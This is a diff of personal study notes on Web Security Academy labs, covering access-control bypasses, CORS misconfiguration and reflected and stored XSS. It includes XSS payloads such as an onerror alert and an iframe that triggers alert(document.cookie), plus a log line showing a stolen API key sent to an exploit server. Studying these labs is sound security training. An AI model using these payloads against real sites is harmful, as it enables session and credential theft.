@@ -76,6 +76,7 @@ Before redirection, the API key for carlos is leaked.
 ### Horizontal to vertical privilege escalation
 
 #### [Lab]: User ID controlled by request parameter with password disclosure
+
 ```
 Login as wiener/peter
 Go to /my-account?user=administrator
@@ -105,7 +106,9 @@ Login to carlos' account
 ```
 
 ### Access control vulnerabilities in multi-step processes
+
 #### [Lab]: Multi-step process with no access control on one step
+
 ```
 
 Login as adminstrator/admin
@@ -118,6 +121,7 @@ Repeat the request while logged in as wiener
 ```
 
 ### Referer-based access control
+
 #### [Lab]: Referer-based access control
 
 ```
@@ -137,7 +141,7 @@ Circumvented using web proxies, VPNs, or manipulation of client-side geolocation
 
 -----
 
-## Cross Origin Resource Sharing (CORS)
+### Cross Origin Resource Sharing (CORS)
 
 - Browser mechanism for controlled access of resources outside given domain.
 - Extends and adds functionality to Same Origin Policy (SOP).
@@ -275,7 +279,7 @@ Check the log
 192.168.1.12    2020-02-06 19:27:31 +0000 "GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22oyEfZl4UJC3kIc6IvycliwYYSdIwliXj%22} HTTP/1.1" 200 "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.142 Safari/537.36 PSAcademy/939914"
 ```
 
-## Exploiting XSS via CORS trust relationships 
+### Exploiting XSS via CORS trust relationships 
 
 - If Website A trusts Website B, and Website B is vulnerable to XSS
 - Attack can exploit XSS to inject JavaScript that uses CORS to retrieve sensitive information.
@@ -298,7 +302,7 @@ You could chain CORS and XSS as follows
 
 ``` https://subdomain.vulnerable-website.com/?xss=<script>cors-stuff-here</script>```
 
-## Breaking TLS with poorly configured CORS
+### Breaking TLS with poorly configured CORS
 
 - An application uses HTTPS but whitelists a trusted subdomain that is using plain HTTP.
 
@@ -310,7 +314,7 @@ You could chain CORS and XSS as follows
 6. The application allows the request because this is a whitelisted origin. The requested sensitive data is returned in the response.
 7. The attacker's spoofed page can read the sensitive data and transmit it to any domain under the attacker's control.
 
-### [Lab]: CORS vulnerability with trusted insecure protocols
+#### [Lab]: CORS vulnerability with trusted insecure protocols
 
 ```
 <script>
@@ -326,13 +330,13 @@ function reqListener() {
 </script>
 ```
 
-## Intranets and CORS without credentials
+### Intranets and CORS without credentials
 
 - Without ACAO header we can't get cookies, but we can still access the website.
 - There is one common situation where an attacker can't access a website directly.
 - Internal websites are often held to a lower security standard than external sites.
 
-### [Lab]: CORS vulnerability with internal network pivot attack
+#### [Lab]: CORS vulnerability with internal network pivot attack
 
 ```TBD```
 
@@ -348,11 +352,24 @@ It allows an attacker to circumvent the same origin policy.
 - Stored
 - DOM-based
 
-### [Lab]: Reflected XSS into HTML context with nothing encoded
+### Reflected XSS
+
+Includes data from an HTTP request in the immediate response.
+
+How to:
+
+- Test every entry point: parameters, message body, URL file path, HTTP headers.
+- Submit random alphanumeric values: determine whether it is reflected in response.
+- Determine the reflection context: between tags, within quoted tag attribute, within javascript string, etc.
+- Test a candidate payload: using Burp Repeater send random value + payload and see if it works.
+- Test alternative payloads: based on context of reflection and input validation.
+- Test the attack in a browser.
+
+#### [Lab]: Reflected XSS into HTML context with nothing encoded
 
 Search bar ```<img src=x onerror=alert(1)>```
 
-### [Lab]: Reflected XSS into HTML context with most tags and attributes blocked
+#### [Lab]: Reflected XSS into HTML context with most tags and attributes blocked
 
 ```<h1>0 search results for 'asdf'</h1>```
 
@@ -376,7 +393,30 @@ Couldn't figure it out after a long time, so looked at the solution.
 <iframe src="https://acd01f971f79e697801234c9007200e0.web-security-academy.net/?search=%3Cbody+onresize%3Dalert%28document.cookie%29%3E" onload=this.style.width='100px'>
 ```
 
-### [Lab]: Stored XSS into HTML context with nothing encoded
+### Stored XSS
+
+Includes unsafe data from an untrusted source in its later HTTP responses.
+
+How to:
+
+- Test entry points:
+	- URL query string, message body
+	- URL file path
+	- HTTP request headers
+	- Out-of-band routes
+	
+- Test exit points:
+	- Since it is challenging
+	- Test if value appears in immediate response
+	- If it does, test if it appears in consequent responses
+
+#### [Lab]: Stored XSS into HTML context with nothing encoded
 
 Comment ```<img src=x onerror=alert(1)>```
+
+## DOM-based
+
+
+
+
 
